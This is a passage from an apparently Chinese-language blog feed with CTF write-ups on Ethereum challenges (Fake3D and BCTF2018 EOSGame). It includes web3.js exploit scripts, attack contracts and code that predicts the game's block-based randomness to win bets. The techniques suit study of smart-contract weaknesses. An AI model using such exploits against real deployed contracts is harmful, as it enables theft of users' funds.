<span class="hljs-literal">true</span>,</span><br><span class="line"><span class="hljs-string">"inputs"</span>: [</span><br><span class="line">&#123;</span><br><span class="line"><span class="hljs-string">"name"</span>: <span class="hljs-string">""</span>,</span><br><span class="line"><span class="hljs-string">"type"</span>: <span class="hljs-string">"address"</span></span><br><span class="line">&#125;</span><br><span class="line">],</span><br><span class="line"><span class="hljs-string">"name"</span>: <span class="hljs-string">"balance"</span>,</span><br><span class="line"><span class="hljs-string">"outputs"</span>: [</span><br><span class="line">&#123;</span><br><span class="line"><span class="hljs-string">"name"</span>: <span class="hljs-string">""</span>,</span><br><span class="line"><span class="hljs-string">"type"</span>: <span class="hljs-string">"uint256"</span></span><br><span class="line">&#125;</span><br><span class="line">],</span><br><span class="line"><span class="hljs-string">"payable"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line"><span class="hljs-string">"stateMutability"</span>: <span class="hljs-string">"view"</span>,</span><br><span class="line"><span class="hljs-string">"type"</span>: <span class="hljs-string">"function"</span></span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line"><span class="hljs-string">"inputs"</span>: [</span><br><span class="line">&#123;</span><br><span class="line"><span class="hljs-string">"name"</span>: <span class="hljs-string">"_addr"</span>,</span><br><span class="line"><span class="hljs-string">"type"</span>: <span class="hljs-string">"address"</span></span><br><span class="line">&#125;</span><br><span class="line">],</span><br><span class="line"><span class="hljs-string">"payable"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line"><span class="hljs-string">"stateMutability"</span>: <span class="hljs-string">"nonpayable"</span>,</span><br><span class="line"><span class="hljs-string">"type"</span>: <span class="hljs-string">"constructor"</span></span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line"><span class="hljs-string">"anonymous"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line"><span class="hljs-string">"inputs"</span>: [</span><br><span class="line">&#123;</span><br><span class="line"><span class="hljs-string">"indexed"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line"><span class="hljs-string">"name"</span>: <span class="hljs-string">"b64email"</span>,</span><br><span class="line"><span class="hljs-string">"type"</span>: <span class="hljs-string">"string"</span></span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line"><span class="hljs-string">"indexed"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line"><span class="hljs-string">"name"</span>: <span class="hljs-string">"slogan"</span>,</span><br><span class="line"><span class="hljs-string">"type"</span>: <span class="hljs-string">"string"</span></span><br><span class="line">&#125;</span><br><span class="line">],</span><br><span class="line"><span class="hljs-string">"name"</span>: <span class="hljs-string">"FLAG"</span>,</span><br><span class="line"><span class="hljs-string">"type"</span>: <span class="hljs-string">"event"</span></span><br><span class="line">&#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sendSigned</span>(<span class="hljs-params">txData</span>) </span>&#123;</span><br><span class="line">    web3.eth.accounts.signTransaction(txData, <span class="hljs-string">'0x6c332f680...'</span>)</span><br><span class="line">        .then(<span class="hljs-function"><span class="hljs-params">RLPencodedTx</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="hljs-keyword">let</span> transact = web3.eth.sendSignedTransaction(RLPencodedTx[<span class="hljs-string">'rawTransaction'</span>]);</span><br><span class="line">            transact.on(<span class="hljs-string">'confirmation'</span>, (confirmationNumber, receipt) =&gt; &#123;</span><br><span class="line">                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'confirmation'</span>, confirmationNumber);</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            transact.on(<span class="hljs-string">'transactionHash'</span>, hash =&gt; &#123;</span><br><span class="line">                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'hash'</span>, hash);</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            transact.on(<span class="hljs-string">'receipt'</span>, receipt =&gt; &#123;</span><br><span class="line">                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'reciept'</span>, receipt);</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            transact.on(<span class="hljs-string">'error'</span>, <span class="hljs-built_in">console</span>.error);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> EOSGameContract = <span class="hljs-keyword">new</span> web3.eth.Contract(abi, contractAddress);</span><br><span class="line"><span class="hljs-keyword">let</span> ctf = EOSGameContract.methods.CaptureTheFlag(<span class="hljs-string">'amF5ODBAcHJvdG9ubWFpbC5jb20='</span>).encodeABI();</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> txData = &#123;</span><br><span class="line">    chainId: <span class="hljs-number">3</span>,</span><br><span class="line">    gas: web3.utils.toHex(<span class="hljs-number">2500000</span>),</span><br><span class="line">    gasLimit: web3.utils.toHex(<span class="hljs-number">400</span>*<span class="hljs-number">1e10</span>),</span><br><span class="line">    gasPrice: web3.utils.toHex(<span class="hljs-number">40</span>*<span class="hljs-number">1e10</span>), <span class="hljs-comment">// 10 Gwei</span></span><br><span class="line">    to: contractAddress,</span><br><span class="line">    <span class="hljs-keyword">from</span>: fromAddress,</span><br><span class="line">    value: <span class="hljs-string">"0x0"</span>, <span class="hljs-comment">//web3.utils.toHex(web3.utils.toWei(0, 'wei')),</span></span><br><span class="line">    data: ctf</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sendSigned(txData);</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;查询当前用户的余额使用如下：<br><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="hljs-number">0.4</span><span class="hljs-number">.24</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Fake3D &#123;</span><br><span class="line">    mapping(<span class="hljs-function"><span class="hljs-params">address</span> =&gt;</span> uint256)  public balance;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">airDrop</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">returns</span> (<span class="hljs-params">bool</span>);</span></span><br><span class="line"><span class="hljs-function">    </span></span><br><span class="line"><span class="hljs-function">&#125;</span></span><br><span class="line"><span class="hljs-function"></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-title">contract</span> <span class="hljs-title">GetBalance</span> </span>&#123;</span><br><span class="line">    Fake3D mime = Fake3D(<span class="hljs-number">0x4082cC8839242Ff5ee9c67f6D05C4e497f63361a</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getbalance</span>(<span class="hljs-params"></span>) <span class="hljs-title">view</span> <span class="hljs-title">public</span> <span class="hljs-title">returns</span>(<span class="hljs-params">uint256</span>) </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> mime.balance(tx.origin);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;<del>当能在攻击合约里查到余额大于8888时就发起<code>get_flag</code>。</del></p><p>&emsp;&emsp; <del>在理一下流程就是：首先通过不断部署合约让自己的账户(<code>tx.origin</code>)的余额大于8888，然后用用户对<code>Fake3D</code>合约直接发起转账交易，把金额转到攻击成功的合约地址上，最后在攻击合约中发起get_flag。</del>这里采用直接用用户发起<code>CaptureTheFlag</code>，脑子瓦特了。。。</p><div align="center"><br>    <img src="/images/posts/other/42.png"><br></div><br><div align="center"><br>    <img src="/images/posts/other/43.png"><br></div><p>&emsp;&emsp;这里我给攻击合约转了8900，理论上那么这个攻击合约也是可以发起<code>get_flag</code>的，但实际发现会报：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning! Error encountered during contract execution [Reverted]</span><br></pre></td></tr></table></figure></p><div align="center"><br>    <img src="/images/posts/other/44.png"><br></div><p>&emsp;&emsp;因为这个也要一定的耐心，成功率不会很高，这里就不做get flag操作了，攻击原理跟手段get到就好。。。</p><h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><ul><li><a href="https://segmentfault.com/a/1190000016087669" target="_blank" rel="noopener">https://segmentfault.com/a/1190000016087669</a></li><li><a href="https://www.reddit.com/r/ethereum/comments/916xni/how_to_pwn_fomo3d_a_beginners_guide/" target="_blank">how_to_pwn_fomo3d_a_beginners_guide</a></li><li><a href="https://consensys.github.io/smart-contract-best-practices/recommendations/#avoid-using-extcodesize-to-check-for-externally-owned-accounts" target="_blank">avoid-using-extcodesize-to-check-for-externally-owned-accounts</a></li><li><a href="https://github.com/fergarrui/ethereum-security" target="_blank">ethereum-security</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp;这道题跟上道比简单了点，原理唯一的区别就是如何&lt;code&gt;bypass extcodesize&lt;/code&gt;，而这个网上也有解决方案，EOSGame中的&lt;code&gt;FOMO3D&lt;/code&gt;游戏就发生过这种攻击。&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="blockchain" scheme="http://yoursite.com/tags/blockchain/"/>
    
  </entry>
  
  <entry>
    <title>BCTF2018 EOSGame Study</title>
    <link href="http://yoursite.com/2018/11/bctf2018-eosgame-writeup/"/>
    <id>http://yoursite.com/2018/11/bctf2018-eosgame-writeup/</id>
    <published>2018-11-29T13:40:56.000Z</published>
    <updated>2018-11-30T16:19:00.107Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;在写这个<code>study</code>的时候我的<code>exp</code>还在跑，<code>flag</code>还未拿到，但不管结果如何，我都将记录下在这过程中学习到的东西。<br><a id="more"></a></p><h3 id="远程攻击（可能无效）"><a href="#远程攻击（可能无效）" class="headerlink" title="远程攻击（可能无效）"></a>远程攻击（可能无效）</h3><p>&emsp;&emsp;首先来看看合约内容：</p><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="hljs-number">0.4</span><span class="hljs-number">.24</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment"> * @title SafeMath</span></span><br><span class="line"><span class="hljs-comment"> * @dev Math operations with safety checks that revert on error</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line">library SafeMath &#123;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment">  * @dev Multiplies two numbers, reverts on overflow.</span></span><br><span class="line"><span class="hljs-comment">  */</span></span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">mul</span>(<span class="hljs-params">uint256 a, uint256 b</span>) <span class="hljs-title">internal</span> <span class="hljs-title">pure</span> <span class="hljs-title">returns</span> (<span class="hljs-params">uint256</span>) </span>&#123;</span><br><span class="line">    <span class="hljs-comment">// Gas optimization: this is cheaper than requiring 'a' not being zero, but the</span></span><br><span class="line">    <span class="hljs-comment">// benefit is lost if 'b' is also tested.</span></span><br><span class="line">    <span class="hljs-comment">// See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522</span></span><br><span class="line">    <span class="hljs-keyword">if</span> (a == <span class="hljs-number">0</span>) &#123;</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint256 c = a * b;</span><br><span class="line">    <span class="hljs-built_in">require</span>(c / a == b);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment">  * @dev Integer division of two numbers truncating the quotient, reverts on division by zero.</span></span><br><span class="line"><span class="hljs-comment">  */</span></span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">div</span>(<span class="hljs-params">uint256 a, uint256 b</span>) <span class="hljs-title">internal</span> <span class="hljs-title">pure</span> <span class="hljs-title">returns</span> (<span class="hljs-params">uint256</span>) </span>&#123;</span><br><span class="line">    <span class="hljs-built_in">require</span>(b &gt; <span class="hljs-number">0</span>); <span class="hljs-comment">// Solidity only automatically asserts when dividing by 0</span></span><br><span class="line">    uint256 c = a / b;</span><br><span class="line">    <span class="hljs-comment">// assert(a == b * c + a % b); // There is no case in which this doesn't hold</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment">  * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).</span></span><br><span class="line"><span class="hljs-comment">  */</span></span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sub</span>(<span class="hljs-params">uint256 a, uint256 b</span>) <span class="hljs-title">internal</span> <span class="hljs-title">pure</span> <span class="hljs-title">returns</span> (<span class="hljs-params">uint256</span>) </span>&#123;</span><br><span class="line">    <span class="hljs-built_in">require</span>(b &lt;= a);</span><br><span class="line">    uint256 c = a - b;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment">  * @dev Adds two numbers, reverts on overflow.</span></span><br><span class="line"><span class="hljs-comment">  */</span></span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add</span>(<span class="hljs-params">uint256 a, uint256 b</span>) <span class="hljs-title">internal</span> <span class="hljs-title">pure</span> <span class="hljs-title">returns</span> (<span class="hljs-params">uint256</span>) </span>&#123;</span><br><span class="line">    uint256 c = a + b;</span><br><span class="line">    <span class="hljs-built_in">require</span>(c &gt;= a);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment">  * @dev Divides two numbers and returns the remainder (unsigned integer modulo),</span></span><br><span class="line"><span class="hljs-comment">  * reverts when dividing by zero.</span></span><br><span class="line"><span class="hljs-comment">  */</span></span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">mod</span>(<span class="hljs-params">uint256 a, uint256 b</span>) <span class="hljs-title">internal</span> <span class="hljs-title">pure</span> <span class="hljs-title">returns</span> (<span class="hljs-params">uint256</span>) </span>&#123;</span><br><span class="line">    <span class="hljs-built_in">require</span>(b != <span class="hljs-number">0</span>);</span><br><span class="line">    <span class="hljs-keyword">return</span> a % b;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract EOSToken&#123;</span><br><span class="line">    using SafeMath <span class="hljs-keyword">for</span> uint256;</span><br><span class="line">    string TokenName = <span class="hljs-string">"EOS"</span>;</span><br><span class="line">    </span><br><span class="line">    uint256 totalSupply = <span class="hljs-number">100</span>**<span class="hljs-number">18</span>;</span><br><span class="line">    address owner;</span><br><span class="line">    mapping(<span class="hljs-function"><span class="hljs-params">address</span> =&gt;</span> uint256)  balances;</span><br><span class="line">    </span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        <span class="hljs-built_in">require</span>(msg.sender == owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-keyword">constructor</span>() public&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        balances[owner] = totalSupply;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">mint</span>(<span class="hljs-params">address _to,uint256 _amount</span>) <span class="hljs-title">public</span> <span class="hljs-title">onlyOwner</span> </span>&#123;</span><br><span class="line">        <span class="hljs-built_in">require</span>(_amount &lt; totalSupply);</span><br><span class="line">        totalSupply = totalSupply.sub(_amount);</span><br><span class="line">        balances[_to] = balances[_to].add(_amount);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">transfer</span>(<span class="hljs-params">address _from, address _to, uint256 _amount</span>) <span class="hljs-title">public</span> <span class="hljs-title">onlyOwner</span> </span>&#123;</span><br><span class="line">        <span class="hljs-built_in">require</span>(_amount &lt; balances[_from]);</span><br><span class="line">        balances[_from] = balances[_from].sub(_amount);</span><br><span class="line">        balances[_to] = balances[_to].add(_amount);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eosOf</span>(<span class="hljs-params">address _who</span>) <span class="hljs-title">public</span> <span class="hljs-title">constant</span> <span class="hljs-title">returns</span>(<span class="hljs-params">uint256</span>)</span>&#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> balances[_who];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract EOSGame&#123;</span><br><span class="line">    </span><br><span class="line">    using SafeMath <span class="hljs-keyword">for</span> uint256;</span><br><span class="line">    mapping(<span class="hljs-function"><span class="hljs-params">address</span> =&gt;</span> uint256) public bet_count;</span><br><span class="line">    uint256 FUND = <span class="hljs-number">100</span>;</span><br><span class="line">    uint256 MOD_NUM = <span class="hljs-number">20</span>;</span><br><span class="line">    uint256 POWER = <span class="hljs-number">100</span>;</span><br><span class="line">    uint256 SMALL_CHIP = <span class="hljs-number">1</span>;</span><br><span class="line">    uint256 BIG_CHIP = <span class="hljs-number">20</span>;</span><br><span class="line">    EOSToken  eos;</span><br><span class="line">    </span><br><span class="line">    event FLAG(string b64email, string slogan);</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-keyword">constructor</span>() public&#123;</span><br><span class="line">        eos=<span class="hljs-keyword">new</span> EOSToken();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">initFund</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span></span>&#123;</span><br><span class="line">        <span class="hljs-keyword">if</span>(bet_count[tx.origin] == <span class="hljs-number">0</span>)&#123;</span><br><span class="line">            bet_count[tx.origin] = <span class="hljs-number">1</span>;</span><br><span class="line">            eos.mint(tx.origin, FUND);  <span class="hljs-comment">// 初始化账户 100</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bet</span>(<span class="hljs-params">uint256 chip</span>) <span class="hljs-title">internal</span> </span>&#123;</span><br><span class="line">        bet_count[tx.origin] = bet_count[tx.origin].add(<span class="hljs-number">1</span>);</span><br><span class="line">        uint256 seed = uint256(keccak256(abi.encodePacked(block.number)))+uint256(keccak256(abi.encodePacked(block.timestamp)));</span><br><span class="line">        uint256 seed_hash = uint256(keccak256(abi.encodePacked(seed)));</span><br><span class="line">        uint256 shark = seed_hash % MOD_NUM;</span><br><span class="line"></span><br><span class="line">        uint256 lucky_hash = uint256(keccak256(abi.encodePacked(bet_count[tx.origin])));</span><br><span class="line">        uint256 lucky = lucky_hash % MOD_NUM;</span><br><span class="line">        </span><br><span class="line">        <span class="hljs-keyword">if</span> (shark == lucky)&#123;</span><br><span class="line">            eos.transfer(address(<span class="hljs-keyword">this</span>), tx.origin, chip.mul(POWER));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">smallBlind</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>&#123;</span><br><span class="line">        eos.transfer(tx.origin, address(<span class="hljs-keyword">this</span>), SMALL_CHIP);</span><br><span class="line">        bet(SMALL_CHIP);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bigBlind</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>&#123;</span><br><span class="line">        eos.transfer(tx.origin, address(<span class="hljs-keyword">this</span>), BIG_CHIP);</span><br><span class="line">        bet(BIG_CHIP);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eosBlanceOf</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">view</span> <span class="hljs-title">returns</span>(<span class="hljs-params">uint256</span>) </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> eos.eosOf(tx.origin);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">CaptureTheFlag</span>(<span class="hljs-params">string b64email</span>) <span class="hljs-title">public</span></span>&#123;</span><br><span class="line"><span class="hljs-built_in">require</span> (eos.eosOf(tx.origin) &gt; <span class="hljs-number">18888</span>);</span><br><span class="line">emit FLAG(b64email, <span class="hljs-string">"Congratulations to capture the flag!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;可以看到这是一个竞猜的游戏，我们的目的是下面的条件满足：</p><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> (shark == lucky)&#123;</span><br><span class="line">    eos.transfer(address(<span class="hljs-keyword">this</span>), tx.origin, chip.mul(POWER));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;让合约往我们账上转钱，直到<code>eos.eosOf(tx.origin) &gt; 18888</code>，从而拿到激发<code>FLAG</code>。</p><p>&emsp;&emsp;合约使用的<code>block.number</code>和<code>block.timestamp</code>为当前链上最新的块的<code>编号</code>和<code>时间戳</code>，这两个信息都是公开的，我们可以获取然后使用程序中的判断方法来决定我们什么时候<code>下注</code>。</p><p>&emsp;&emsp;由于之前没有认真学习<code>web3js</code>的库，难点也在如何让程序更合约交互得更加的流畅，写<code>exp</code>的过程中也遇到了很多问题。</p><p>&emsp;&emsp;首先看<code>abi.encodePacked()</code>，这个函数的作用是返回编码过的<code>bytes</code>，如：</p><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getabi</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">view</span> <span class="hljs-title">returns</span>(<span class="hljs-params">bytes</span>) </span>&#123;</span><br><span class="line">    uint number = <span class="hljs-number">12345679</span>;</span><br><span class="line">    <span class="hljs-keyword">return</span> abi.encodePacked(number);</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-comment">// return: 0x0000000000000000000000000000000000000000000000000000000000bc614f</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;经过一番查找，找到了这个函数在<code>web3js</code>中的相应实现：<code>web3.eth.abi.encodeParameter(&#39;uint256&#39;, number)</code>。</p><p>&emsp;&emsp;另一个比较严重的问题是<code>溢出</code>，合约中的类型是<code>uint256</code>，我们用nodejs的大数处理的<code>bignumber.js</code>库，但是要注意当运算结果超过<code>2**256</code>时，需要<code>减掉2**256</code>，这样才符合<code>uint256</code>对溢出的处理。如下：</p><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">let</span> uint256 = <span class="hljs-keyword">new</span> BigNumber(<span class="hljs-string">'115792089237316195423570985008687907853269984665640564039457584007913129639936'</span>);</span><br><span class="line"><span class="hljs-keyword">let</span> number1 = <span class="hljs-keyword">new</span> BigNumber(web3.eth.abi.encodeParameter(<span class="hljs-string">'uint256'</span>, encry1));</span><br><span class="line"><span class="hljs-keyword">let</span> number2 = <span class="hljs-keyword">new</span> BigNumber(web3.eth.abi.encodeParameter(<span class="hljs-string">'uint256'</span>, encry2));</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> result = number1.plus(number2);     <span class="hljs-comment">// 这里可能溢出</span></span><br><span class="line"><span class="hljs-built_in">console</span>.log(<span class="hljs-string">"result: "</span>, result.toFormat().replace(<span class="hljs-regexp">/,/g</span>, <span class="hljs-string">''</span>));</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> (result.gt(uint256)) &#123;</span><br><span class="line">    result = result.minus(uint256).toFormat().replace(<span class="hljs-regexp">/,/g</span>, <span class="hljs-string">''</span>);</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"overflow update result: "</span>, result);</span><br><span 